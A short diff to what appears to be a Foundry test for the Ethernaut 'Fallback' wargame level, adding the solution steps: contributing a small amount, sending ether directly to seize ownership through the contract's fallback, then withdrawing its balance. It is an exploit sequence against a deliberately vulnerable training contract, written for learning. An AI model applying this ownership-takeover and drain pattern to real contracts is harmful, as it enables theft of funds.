@@ -55,6 +55,11 @@ contract TestFallback is Test, Utils {
     /// @notice Test the solution for the level.
     function testSolve() public {
         vm.startPrank(player);
+        vm.deal(player, 1 ether);
+
+        instance.contribute{value: 0.0001 ether}();
+        payable(address(instance)).call{value: 0.1 ether}("");
+        instance.withdraw();
 
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
